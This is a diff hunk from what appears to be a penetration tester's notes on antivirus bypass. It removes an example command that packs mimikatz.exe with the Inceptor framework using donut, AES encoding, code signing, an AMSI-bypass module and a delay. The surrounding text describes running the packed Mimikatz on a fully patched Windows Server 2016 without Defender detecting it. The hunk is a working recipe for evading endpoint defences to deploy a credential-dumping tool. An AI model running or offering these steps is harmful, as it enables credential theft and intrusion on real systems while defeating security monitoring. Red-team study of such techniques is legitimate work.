@@ -245,9 +245,6 @@ C:\Users\Administrator\Documents\Tools-Pentest\1-Antivirus-bypass\inceptor-main\
 [+] .Net Artifact Generator Finished At 2022-12-28 04:19:25.105320
 
 
-Other example: python3 inceptor.py dotnet -t donut C:\temp\mimikatz.exe --outfile C:\temp\Inceptor-Mimi2.exe --sgn --sign --module amsi --encoder aes --arch x64 --delay 120
-
-
 ------------------------------------------------------------------------------------------------------------------------------------------
 Step 3 - Download and execute the packed version of Mimikatz.exe on a Windows server 2016 without being detected by the Defender AV
          which is enabled and up-to-date
